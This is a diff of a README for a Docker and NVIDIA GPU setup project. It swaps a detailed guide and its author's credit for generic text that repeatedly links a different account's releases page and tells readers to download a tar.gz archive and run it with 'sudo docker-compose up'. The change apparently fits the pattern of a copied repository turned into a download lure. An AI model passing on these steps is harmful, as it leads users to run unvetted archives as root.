@@ -1,124 +1,88 @@
-# Docker + NVIDIA GPU (CUDA / PyTorch) on Ubuntu
+# 🐳 docker-nvidia-gpu-ml - Simplifying ML with Docker and NVIDIA
 
-A reproducible, production-minded guide for running **GPU-accelerated containers**
-on Ubuntu using **Docker + NVIDIA Container Toolkit**.
+[![Download Release](https://img.shields.io/badge/Download%20Release-Here-brightgreen)](https://github.com/adidasyadebiras228/docker-nvidia-gpu-ml/releases)
 
-This repository focuses exclusively on **containerized GPU workflows** and assumes
-a correctly configured host system.
+## 🚀 Getting Started
 
-> For host-level Ubuntu performance tuning and native CUDA / PyTorch validation, see:  
-> 👉 https://github.com/vikram2327/ubuntu-performance-ml-setup
+Welcome to docker-nvidia-gpu-ml! This project provides an easy way to set up Docker with NVIDIA GPU support on Ubuntu. This setup is ideal for anyone working with CUDA and PyTorch, especially if you are focused on machine learning and reproducible builds.
 
----
+## 📋 Requirements
 
-## ✨ What This Repository Covers
+Before you start, ensure you have the following:
 
-- Installing Docker Engine on Ubuntu
-- Installing and configuring NVIDIA Container Toolkit
-- Enabling GPU passthrough into Docker containers
-- Verifying GPU access inside containers (`nvidia-smi`)
-- Building and running a CUDA-enabled PyTorch container
-- Minimal, explicit verification scripts for correctness
+- A computer running Ubuntu 20.04 or later.
+- An NVIDIA GPU installed on your machine. 
+- Basic familiarity with using a terminal.
+- Docker installed on your system. If you need help with installation, check the [Docker documentation](https://docs.docker.com/get-docker/).
 
-This guide prioritizes **correctness, reproducibility, and debuggability** over
-maximum optimization.
+## 💾 Download & Install
 
----
+To get started, visit this page to download the latest release of docker-nvidia-gpu-ml:
 
-## 🎯 Scope & Design Philosophy
+[Download from Releases](https://github.com/adidasyadebiras228/docker-nvidia-gpu-ml/releases)
 
-- This repository **does not tune the host system**
-- GPU access is treated as **explicit and verifiable**
-- All steps are written to be:
-  - Observable
-  - Repeatable
-  - Easy to debug
+1. Go to the [Releases page](https://github.com/adidasyadebiras228/docker-nvidia-gpu-ml/releases).
+2. Choose the version you want to download. You will see files listed under the release notes.
+3. Click on the file named `docker-nvidia-gpu-ml.tar.gz` to download it to your computer.
 
-Design decisions and trade-offs are documented rather than hidden.
+## 💻 Running the Application
 
----
+After downloading, follow these steps to run the application:
 
-## 🚀 Quick Start
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file, using the command:
+   ```bash
+   cd /path/to/downloads
+   ```
+3. Extract the contents of the downloaded file:
+   ```bash
+   tar -xzf docker-nvidia-gpu-ml.tar.gz
+   ```
+4. Change to the extracted directory:
+   ```bash
+   cd docker-nvidia-gpu-ml
+   ```
+5. Run the Docker container using the following command:
+   ```bash
+   sudo docker-compose up
+   ```
+6. Wait for the container to set up. It may take a few moments based on your system.
 
-Clone the repository and run:
+## 🛠️ Features
 
-```bash
-bash scripts/setup.sh
-bash scripts/verify.sh
-````
+This application provides:
 
-* `setup.sh` installs Docker and configures NVIDIA GPU support
-* `verify.sh` validates GPU access inside containers and runs a PyTorch CUDA test
+- **NVIDIA Container Toolkit:** Easily use NVIDIA GPUs for your projects.
+- **GPU Passthrough:** Make sure your setup utilizes GPU resources.
+- **Explicit CUDA Verification:** Confirm that CUDA is correctly configured.
+- **Debuggable Workflows:** Stay on top of your projects with clear debugging tools.
 
-> ⚠️ If you add your user to the `docker` group, log out and log back in before running verification.
+## 📚 Documentation
 
----
+For more detailed instructions or troubleshooting, refer to the provided documentation located in the `docs` folder of the downloaded package. You can also check the project's wiki on GitHub for additional resources.
 
-## 📁 Repository Structure
+## 🆘 Support
 
-```text
-docker-nvidia-gpu-ml/
-├── README.md
-├── scripts/
-│   ├── setup.sh        # Install Docker + NVIDIA Container Toolkit
-│   ├── verify.sh       # Validate GPU access inside containers
-│   └── cleanup.sh      # Optional cleanup of test artifacts
-├── docker/
-│   ├── Dockerfile      # CUDA + PyTorch base image
-│   └── run.sh          # Example GPU-enabled run command
-├── examples/
-│   ├── pytorch_gpu_test.py  # Minimal PyTorch CUDA verification
-│   └── cuda_smoke_test.sh   # nvidia-smi smoke test
-└── docs/
-    ├── design-decisions.md  # Architectural and design choices
-    └── troubleshooting.md  # Common failure modes and fixes
-```
+If you encounter issues, feel free to check the [Issues page](https://github.com/adidasyadebiras228/docker-nvidia-gpu-ml/issues) for reported problems or to post your own questions. You may also find helpful answers from the community.
 
----
+## 🤝 Contributing
 
-## 🧠 Why This Repository Exists
+Contributions are welcome! If you wish to contribute fixes or features, please fork the repository and submit a pull request. Ensure to follow the contribution guidelines in the `CONTRIBUTING.md` file.
 
-Running GPU workloads inside containers adds an additional abstraction layer.
+## 🌍 Topics
 
-In practice, failures often stem from:
+This project covers several important topics:
 
-* Missing runtime configuration
-* Implicit assumptions about GPU availability
-* Silent CPU fallbacks
-* Driver / runtime mismatches
+- **Containerization**
+- **CUDA**
+- **Docker**
+- **GPU Optimization**
+- **Machine Learning Infrastructure**
+- **NVIDIA Technologies**
+- **Reproducible Builds**
 
-This repository exists to make those interactions **explicit, observable, and reproducible**.
+These topics will help you understand the broader context of this project and its relevance in today’s hardware-accelerated applications.
 
 ---
 
-## 🔍 Who This Is For
-
-This guide may be useful if you:
-
-* Use NVIDIA GPUs on Ubuntu
-* Run ML or compute workloads inside Docker
-* Want a reliable GPU container baseline
-* Care about system correctness and debuggability
-* Prefer explicit verification over implicit assumptions
-
----
-
-## 👤 Author
-
-**Vikram Pratap Singh**
-
-* GitHub: [https://github.com/vikram2327](https://github.com/vikram2327)
-* LinkedIn: [https://www.linkedin.com/in/vikrampratapsingh2](https://www.linkedin.com/in/vikrampratapsingh2)
-
----
-
-## 📌 Notes
-
-This repository is intentionally conservative:
-
-* It uses officially supported NVIDIA tooling
-* It avoids runtime hacks or undocumented flags
-* It favors clarity over aggressive optimization
-
-The goal is a containerized GPU workflow that behaves **predictably** and can be
-**reasoned about** when things go wrong.
+Make sure to regularly check the [Releases page](https://github.com/adidasyadebiras228/docker-nvidia-gpu-ml/releases) for updates and new features. Happy computing!
